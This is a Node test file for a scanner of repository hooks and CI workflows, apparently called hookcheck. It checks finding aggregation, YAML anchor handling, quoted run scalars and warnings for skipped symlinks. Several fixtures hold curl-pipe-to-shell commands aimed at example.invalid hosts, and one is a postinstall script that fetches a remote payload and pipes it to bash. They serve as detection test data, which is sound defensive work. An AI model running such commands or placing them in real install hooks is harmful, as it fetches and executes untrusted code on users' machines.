/**
 * Fix Pass 2, release 2 (v0.1.15): P-070, P-075, P-073, P-074, P-076.
 *
 * P-070 REAL: a single 5 MB workflow file of about 92,000 repeated
 * benign steps emitted one finding record per step (91,980 findings,
 * 35,390,354 bytes of JSON, 23.7s on the published 0.1.14). Repeated
 * identical SAFE findings now collapse into one counted aggregate
 * record per (file, source, hook, command, classification, rules,
 * evidence) group, the report carries an explicit aggregation note
 * in JSON and in the human renderer, RISKY and UNKNOWN findings are
 * never aggregated, and the verdict and exit codes are computed on
 * the full inventory before aggregation.
 *
 * P-075 REAL, low: trailing whitespace on YAML lines broke anchor
 * resolution. A map anchor line whose only trailing content is
 * whitespace matched the scalar-anchor pattern with a whitespace
 * "value", so the anchor never registered as a mapping, its
 * definition run line was inventoried as a live step, and alias and
 * merge-key steps resolved to an empty command at UNKNOWN. A
 * whitespace-only mutation must not change any classification: the
 * mutant finding multiset must be identical to the baseline.
 *
 * P-073 COSMETIC: line numbers ran 5 early at about 92,000 steps on
 * 0.1.7. Not reproduced at 20,000 steps on 0.1.13 (Round 3) and not
 * reproduced at 91,980 steps on 0.1.14 in this pass (index 0 at line
 * 7, index 100 at line 107, index 91979 at line 91986, all exact);
 * the unit pin below holds line accuracy at 25,000 steps. No line
 * number fix is claimed.
 *
 * P-074 COSMETIC: symlinked and unreadable hook surfaces were
 * skipped with warnings []. The no-follow policy for symlinked
 * directories stands; every skipped surface now produces one
 * warnings entry naming the path and the reason, in JSON and in the
 * human output, and a scan that skipped surfaces floors at REVIEW
 * under the partial-scan precedent (P-049, P-065).
 *
 * P-076 COSMETIC: a quoted run scalar (run: "echo single-line")
 * classified UNKNOWN where the unquoted form classified SAFE.
 * Plain quoted run scalars are unquoted before classification, so
 * both forms produce the identical finding.
 */
import { describe, it, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { renderReport, scanHooks } from "../src/core.js";

function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hookcheck-0115-"));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}
const dirs: string[] = [];
function fx(files: Record<string, string>): string { const d = fixture(files); dirs.push(d); return d; }
after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

const WF_HEAD = ["name: ci", "on: [push]", "jobs:", "  build:", "    runs-on: ubuntu-latest", "    steps:"];
function workflow(steps: string[]): string {
  return [...WF_HEAD, ...steps.map((s) => `      - run: ${s}`)].join("\n") + "\n";
}
function multiset(dir: string): string[] {
  const r = scanHooks(dir);
  return r.findings.map((f) => `${f.classification}|${f.rules.join(",")}|${f.command}`).sort();
}

describe("P-070: repeated identical SAFE findings aggregate into counted records", () => {
  it("50 identical SAFE steps collapse to one aggregate record; distinct, RISKY, and UNKNOWN findings stay individual", () => {
    const steps = [
      ...Array.from({ length: 50 }, () => "echo hello world this is a filler step line"),
      "echo a different step",
      "curl -s https://example.invalid/health",
      "make some-custom-target",
    ];
    const r = scanHooks(fx({ ".github/workflows/big.yml": workflow(steps) }));
    assert.equal(r.verdict, "REVIEW");
    assert.equal(r.findings.length, 4, `findings: ${JSON.stringify(r.findings.map((f) => [f.classification, f.command]))}`);
    const agg = r.findings.find((f) => f.command === "echo hello world this is a filler step line");
    assert.ok(agg, "aggregate record present");
    assert.equal(agg.classification, "SAFE");
    assert.equal(agg.count, 50);
    assert.equal(agg.line, 7);
    assert.equal(agg.lastLine, 56);
    assert.ok(r.aggregation, "aggregation note object present in JSON");
    assert.equal(r.aggregation.findingsBeforeAggregation, 53);
    assert.equal(r.aggregation.aggregateRecords, 1);
    assert.equal(r.aggregation.collapsedFindings, 49);
    assert.match(r.aggregation.note, /aggregat/i);
    assert.equal(r.counts.total, 4);
    assert.equal(r.counts.safe, 2);
    assert.match(renderReport(r), /aggregat/i, "human output carries the aggregation note");
  });

  it("identical RISKY steps are never aggregated", () => {
    const r = scanHooks(fx({ ".github/workflows/ci.yml": workflow(Array.from({ length: 5 }, () => "curl -s https://example.invalid/health")) }));
    assert.equal(r.findings.length, 5);
    assert.ok(r.findings.every((f) => f.classification === "RISKY" && f.count === undefined));
    assert.equal(r.aggregation, undefined);
  });

  it("identical UNKNOWN steps are never aggregated", () => {
    const r = scanHooks(fx({ ".github/workflows/ci.yml": workflow(Array.from({ length: 5 }, () => "make some-custom-target")) }));
    assert.equal(r.findings.length, 5);
    assert.ok(r.findings.every((f) => f.classification === "UNKNOWN" && f.count === undefined));
    assert.equal(r.aggregation, undefined);
  });

  it("identical SAFE steps in different files aggregate per file, never across files", () => {
    const one = workflow(["echo same step", "echo same step", "echo same step"]);
    const r = scanHooks(fx({ ".github/workflows/a.yml": one, ".github/workflows/b.yml": one }));
    assert.equal(r.findings.length, 2);
    assert.ok(r.findings.every((f) => f.count === 3));
    assert.deepEqual(r.findings.map((f) => f.file).sort(), [".github/workflows/a.yml", ".github/workflows/b.yml"]);
  });

  it("two identical SAFE steps do not collapse (aggregation is for mass repetition)", () => {
    const r = scanHooks(fx({ ".github/workflows/ci.yml": workflow(["echo twice", "echo twice", "echo once"]) }));
    assert.equal(r.findings.length, 3);
    assert.equal(r.aggregation, undefined);
  });
});

describe("P-075: trailing whitespace must not change anchor resolution", () => {
  const BASELINE = [
    "x-bad-step: &bad_step",
    "  name: Anchored bad step",
    "  run: curl http://example.invalid/anchor | sh",
    'x-bad-cmd: &bad_cmd "curl http://example.invalid/anchored-scalar | sh"',
    "name: CI",
    "on: [push]",
    "jobs:",
    "  build:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - uses: actions/checkout@v4",
    "      - *bad_step",
    "      - name: Anchored scalar step",
    "        run: *bad_cmd",
    "      - name: Merge key step",
    "        <<: *bad_step",
    "      - name: Visible safe step",
    "        run: echo hello",
  ].join("\n") + "\n";
  const MUTANT = BASELINE.split("\n").map((l) => (l === "" ? l : l + "   ")).join("\n");

  it("the baseline anchors resolve: 4 findings, 3 RISKY, verdict COMPROMISED-PATTERN", () => {
    const r = scanHooks(fx({ ".github/workflows/ci.yml": BASELINE }));
    assert.equal(r.counts.total, 4);
    assert.equal(r.counts.risky, 3);
    assert.equal(r.verdict, "COMPROMISED-PATTERN");
  });

  it("the trailing-whitespace mutant's finding multiset is identical to the baseline", () => {
    const b = fx({ ".github/workflows/ci.yml": BASELINE });
    const m = fx({ ".github/workflows/ci.yml": MUTANT });
    assert.deepEqual(multiset(m), multiset(b));
    assert.equal(scanHooks(m).verdict, scanHooks(b).verdict);
    assert.equal(scanHooks(m).counts.total, 4);
  });
});

describe("P-076: a quoted run scalar classifies like the unquoted form", () => {
  it("double-quoted and single-quoted echo steps are SAFE with the unquoted command text", () => {
    for (const form of ['"echo single-line"', "'echo single-line'"]) {
      const r = scanHooks(fx({ ".github/workflows/ci.yml": workflow([form]) }));
      assert.equal(r.findings.length, 1);
      assert.equal(r.findings[0].classification, "SAFE", `form ${form}`);
      assert.equal(r.findings[0].command, "echo single-line");
    }
  });

  it("the quoted and unquoted pair produce identical findings", () => {
    const wf = (run: string) => ["name: ci", "on: [push]", "jobs:", "  build:", "    runs-on: ubuntu-latest", "    steps:", "      - run: |", "          curl http://example.invalid/x", `      - run: ${run}`].join("\n") + "\n";
    const b = scanHooks(fx({ ".github/workflows/ci.yml": wf("echo single-line") }));
    const m = scanHooks(fx({ ".github/workflows/ci.yml": wf('"echo single-line"') }));
    assert.deepEqual(
      m.findings.map((f) => [f.classification, f.rules, f.command]),
      b.findings.map((f) => [f.classification, f.rules, f.command]),
    );
    assert.equal(m.verdict, b.verdict);
  });

  it("control: a quoted risky command stays RISKY", () => {
    const r = scanHooks(fx({ ".github/workflows/ci.yml": workflow(['"curl https://example.invalid/x | sh"']) }));
    assert.equal(r.findings[0].classification, "RISKY");
    assert.ok(r.findings[0].rules.includes("CURL-PIPE-SH"));
  });
});

describe("P-074: skipped symlinked and unreadable surfaces warn by name", () => {
  it("a symlinked directory holding a payload is not followed, is warned by path, and floors the verdict at REVIEW", () => {
    const outside = fixture({ "package.json": JSON.stringify({ name: "evil", scripts: { postinstall: "curl -s https://evil.example.invalid/x | bash" } }) });
    const dir = fx({ ".github/workflows/ci.yml": workflow(["echo hello"]) });
    symlinkSync(outside, join(dir, "linked-dir"));
    const r = scanHooks(dir);
    assert.ok(!r.findings.some((f) => f.file.includes("linked-dir")), "payload behind the symlink is not inventoried");
    assert.ok(r.warnings.some((w) => w.includes("linked-dir") && /symbolic link|symlink/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
    assert.equal(r.verdict, "REVIEW", "a scan that skipped a surface does not present as a bare CLEAN");
    assert.match(renderReport(r), /linked-dir/, "human output carries the warning");
  });

  it("a dangling symlink inside a hook directory warns by path instead of vanishing", () => {
    const dir = fx({ ".github/workflows/ci.yml": workflow(["echo hello"]), ".husky/keep": "echo ok\n" });
    symlinkSync("/nonexistent-hook-target-xyz", join(dir, ".husky", "broken-link"));
    const r = scanHooks(dir);
    assert.ok(r.warnings.some((w) => w.includes(".husky/broken-link")), `warnings: ${r.warnings.join(" | ")}`);
    assert.equal(r.verdict, "REVIEW");
  });

  it("a settings path trapped in a symlink loop warns by path instead of vanishing", () => {
    const dir = fx({ ".github/workflows/ci.yml": workflow(["echo hello"]) });
    mkdirSync(join(dir, ".claude"), { recursive: true });
    symlinkSync("settings.json", join(dir, ".claude", "settings.json"));
    const r = scanHooks(dir);
    assert.ok(r.warnings.some((w) => w.includes(".claude/settings.json")), `warnings: ${r.warnings.join(" | ")}`);
    assert.equal(r.verdict, "REVIEW");
  });
});

describe("P-073: line numbers stay exact at scale (not reproduced; pin)", () => {
  it("sampled findings at 25,000 steps carry their true file lines", () => {
    const n = 25000;
    const steps = Array.from({ length: n }, (_, i) => `echo step ${i}`);
    const r = scanHooks(fx({ ".github/workflows/big.yml": workflow(steps) }));
    const byCmd = new Map(r.findings.map((f) => [f.command, f]));
    // Aggregation is off here: every step text is distinct.
    assert.equal(r.findings.length, n);
    for (const i of [0, 1, 100, 1000, n - 1]) {
      assert.equal(byCmd.get(`echo step ${i}`)?.line, 7 + i, `step ${i}`);
    }
  });
});
